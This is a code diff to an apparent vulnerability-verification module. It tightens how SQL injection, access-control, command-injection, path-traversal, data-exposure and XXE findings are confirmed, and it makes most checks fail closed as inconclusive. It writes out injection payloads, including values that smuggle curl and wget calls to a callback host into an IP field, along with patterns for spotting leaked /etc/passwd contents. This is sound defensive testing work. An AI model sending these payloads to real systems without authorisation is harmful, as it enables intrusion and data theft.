@@ -181,15 +181,19 @@ def verify_sqli(candidate: Candidate, transport: Transport) -> Verdict:
             return None
 
     # Benign control: a non-SQL wrong login must NOT yield a token. If it does, the endpoint hands
-    # out tokens regardless of credentials — any "bypass" below would be a false positive.
+    # out tokens regardless of credentials — any "bypass" below would be a false positive. If the
+    # control itself can't be established (transport error / 5xx), we CANNOT prove a later token is a
+    # bypass rather than a give-tokens-to-anyone endpoint -> a payload hit becomes INCONCLUSIVE.
+    benign_ok = False
     try:
         cs, cb = transport.request("POST", candidate.url,
                                    json={field_name: "grin-benign@example.test", "password": password})
         if cs == 200 and token_of(cb) is not None:
             return Verdict(REJECTED, "sql-injection", loc,
                            "login returns a token for benign wrong credentials — not an injection bypass")
+        benign_ok = bool(cs) and cs < 500
     except Exception:
-        pass
+        benign_ok = False
 
     reached = False   # got at least one clean (non-5xx) response
     for payload in SQLI_PAYLOADS:
@@ -203,7 +207,10 @@ def verify_sqli(candidate: Candidate, transport: Transport) -> Verdict:
         reached = True
         if status != 200:
             continue        # a 401 is a clean rejection of this payload, not a bypass
-        if token_of(body) is not None:   # a real session token, and the benign control got none
+        if token_of(body) is not None:   # a real session token
+            if not benign_ok:
+                return Verdict(INCONCLUSIVE, "sql-injection", loc,
+                               "payload yielded a token but the benign control could not be established")
             return Verdict(CONFIRMED, "sql-injection", loc,
                            f"login bypassed with payload {payload!r}")
     if not reached:
@@ -221,9 +228,14 @@ def verify_bac(candidate: Candidate, transport: Transport) -> Verdict:
     if anon is None:
         return Verdict(INCONCLUSIVE, "broken-access-control", loc, "needs an anonymous session")
     baseline_url = candidate.oracle.get("baseline_url")
+    if not baseline_url:
+        # The SPA-shell baseline diff IS the precision: without it any non-empty 200 on a sensitive
+        # path would confirm. Fail closed rather than risk a catch-all-shell false positive.
+        return Verdict(INCONCLUSIVE, "broken-access-control", loc,
+                       "needs a baseline_url for the SPA-shell diff")
     try:
         status, body = anon(candidate.url)
-        _bs, bbody = anon(baseline_url) if baseline_url else (0, "")
+        _bs, bbody = anon(baseline_url)
     except Exception:
         return Verdict(INCONCLUSIVE, "broken-access-control", loc, "request raised an exception")
     body, bbody = body or "", bbody or ""
@@ -264,7 +276,9 @@ def _find_record_with_marker(body: str, marker_field: str, nonce: str):
                 walk(v)
 
     walk(data)
-    return found[0] if found else None
+    # Exactly one match pins the record we wrote. Zero -> not surfaced; >1 -> a nonce collision we
+    # can't disambiguate, so don't guess (upstream treats None as "did not surface" / INCONCLUSIVE).
+    return found[0] if len(found) == 1 else None
 
 
 def verify_write_authz(candidate: Candidate, transport: Transport) -> Verdict:
@@ -335,6 +349,11 @@ def verify_write_authz(candidate: Candidate, transport: Transport) -> Verdict:
     # ownership survived. Scan the record's OTHER scalar fields (skip the forged + marker fields, so
     # the attacker's own marker text never triggers a false REJECTED).
     attacker_ids = [str(a).strip().lower() for a in (o.get("attacker_identity") or []) if a]
+    if not attacker_ids:
+        # Without the attacker's true identity we cannot run the cosmetic-field guard, so we cannot
+        # rule out that a separate field still attributes the record to the attacker. Fail closed.
+        return Verdict(INCONCLUSIVE, "broken-access-control", loc,
+                       "no attacker_identity supplied — cannot run the cosmetic-field guard")
     for k, v in forged.items():
         if k in (ff, mf):
             continue
@@ -404,9 +423,14 @@ def verify_error_sqli(candidate: Candidate, transport: Transport) -> Verdict:
     sig = next((s for s in _DB_ERROR_SIGNATURES if s in bl), None)
     if sig is None:
         return Verdict(REJECTED, "sql-injection", loc, "a single quote did not surface a database error")
-    if sig in al or sig in cl:
+    if sig in al:
+        # The benign baseline already surfaces this DB-error fingerprint (persistent footer / stack
+        # trace) -> we can't attribute it to the broken quote. Couldn't test, not a clean negative.
+        return Verdict(INCONCLUSIVE, "sql-injection", loc,
+                       "the baseline already surfaces database-error fingerprints — cannot isolate the broken quote")
+    if sig in cl:
         return Verdict(REJECTED, "sql-injection", loc,
-                       "the database-error signature is not specific to the broken-quote input")
+                       "the balanced (escaped) control errors too — not specific to the broken-quote input")
     if marker not in b:
         return Verdict(REJECTED, "sql-injection", loc,
                        "the database error does not echo the injected input (no payload-adjacent evidence)")
@@ -507,13 +531,18 @@ def verify_blind_cmd_injection(candidate: Candidate, transport: Transport) -> Ve
             return agent(candidate.url, method="POST", json={field: value})
         return agent(_with_param(candidate.url, field, value))
 
+    delivered = False
     for value in (f"127.0.0.1; curl -s {cb} #", f"127.0.0.1; wget -q -O- {cb} #",
                   f"$(curl -s {cb})", f"`wget -q -O- {cb}`", f"127.0.0.1| curl -s {cb} #",
                   f"127.0.0.1\ncurl -s {cb}"):
         try:
             send(value)
+            delivered = True
         except Exception:
             continue
+    if not delivered:    # endpoint unreachable — "couldn't test", not a clean no-callback negative
+        return Verdict(INCONCLUSIVE, "command-injection", loc,
+                       "could not deliver any injection payload to the endpoint")
     return _oob_defer_or_poll(
         o, oob, "command-injection", loc,
         [{"tokens": [token], "pred": "external",
@@ -528,7 +557,6 @@ def verify_blind_cmd_injection(candidate: Candidate, transport: Transport) -> Ve
 _PT_ROOT_RE = re.compile(r"(?:^|[^\w])root:[^:\n]*:0:0:")
 _PT_SECOND_RE = re.compile(
     r"(?:^|[^\w])(?:daemon|bin|sys|sync|nobody|nginx|www-data|mail|games|adm|lp):[^:\n]*:\d+:\d+:")
-_PT_WAF = (403, 406, 429, 451)
 
 
 def _is_passwd(body):
@@ -575,7 +603,7 @@ def verify_path_traversal(candidate: Candidate, transport: Transport) -> Verdict
             status, body = send(value)
         except Exception:
             continue
-        if status in _PT_WAF:
+        if status in _WAF_BLOCK:
             return Verdict(INCONCLUSIVE, "path-traversal", loc, "probe appears policy-blocked (WAF)")
         if not status:
             continue
@@ -589,7 +617,6 @@ def verify_path_traversal(candidate: Candidate, transport: Transport) -> Verdict
 
 
 # --- OS command injection (execution-proven via shell arithmetic) -----------------------------
-_CMDI_WAF = (403, 406, 429, 451)
 
 
 def verify_cmd_injection(candidate: Candidate, transport: Transport) -> Verdict:
@@ -621,8 +648,9 @@ def verify_cmd_injection(candidate: Candidate, transport: Transport) -> Verdict:
     except Exception:
         return Verdict(INCONCLUSIVE, "command-injection", loc, "request raised an exception")
     bbody = bbody or ""
-    if sentinel in bbody:        # astronomically unlikely; means the baseline already evaluated it
-        return Verdict(REJECTED, "command-injection", loc, "computed sentinel present without injection")
+    if sentinel in bbody:        # astronomically unlikely; baseline already contains the product
+        return Verdict(INCONCLUSIVE, "command-injection", loc,
+                       "baseline already contains the computed sentinel — cannot test cleanly")
     payloads = (f"127.0.0.1; {arith} #", f"127.0.0.1| {arith} #", f"127.0.0.1&& {arith} #",
                 f"127.0.0.1\n{arith}", f"$({arith})", f"`{arith}`")
     reached = False
@@ -631,7 +659,7 @@ def verify_cmd_injection(candidate: Candidate, transport: Transport) -> Verdict:
             status, pbody = send(value)
         except Exception:
             continue
-        if status in _CMDI_WAF:
+        if status in _WAF_BLOCK:
             return Verdict(INCONCLUSIVE, "command-injection", loc, "probe appears policy-blocked (WAF)")
         if not status:
             continue
@@ -1080,9 +1108,12 @@ def verify_exposure(candidate: Candidate, transport: Transport) -> Verdict:
     import json as _json
     loc = candidate.location
     anon = transport.by_role.get("anon")
-    getter = anon if anon is not None else (lambda u: transport.request("GET", u))
+    if anon is None:
+        # The whole oracle is "served to an ANONYMOUS request" — without an anon session we'd probe
+        # the default (possibly authenticated) transport and mislabel an authed leak. Fail closed.
+        return Verdict(INCONCLUSIVE, "excessive-data-exposure", loc, "needs an anonymous session")
     try:
-        status, body = getter(candidate.url)
+        status, body = anon(candidate.url)
     except Exception:
         return Verdict(INCONCLUSIVE, "excessive-data-exposure", loc, "request raised an exception")
     if status in (401, 403, 404):
@@ -1221,7 +1252,10 @@ def verify_xxe(candidate: Candidate, transport: Transport) -> Verdict:
         sent_any = True
         bbody, abody = bbody or "", abody or ""
         benign_usable = bool(bs) and bs < 400 and bool(bbody)   # only trust the diff if comparable
-        if benign_usable and not _is_passwd(bbody) and _is_passwd(abody):
+        if benign_usable and _is_passwd(bbody):
+            return Verdict(INCONCLUSIVE, "xxe", loc,
+                           "the benign-entity baseline already looks like /etc/passwd — cannot test cleanly")
+        if benign_usable and _is_passwd(abody):
             return Verdict(CONFIRMED, "xxe", loc,
                            "in-band XXE: an external entity read /etc/passwd (>=2 passwd lines in the "
                            "response, absent from a benign-entity baseline)")
@@ -1254,6 +1288,10 @@ def verify_xxe(candidate: Candidate, transport: Transport) -> Verdict:
 
     if not sent_any:
         return Verdict(INCONCLUSIVE, "xxe", loc, "could not POST an XML body to the endpoint")
+    if oob is not None and not oob.healthy():
+        # in-band came back negative, but the blind arm could not run against a dead collaborator
+        return Verdict(INCONCLUSIVE, "xxe", loc,
+                       "in-band negative; OOB collaborator unavailable for the blind XXE arm")
     return Verdict(REJECTED, "xxe", loc, "no external-entity resolution (no file read, no out-of-band fetch)")
 
 
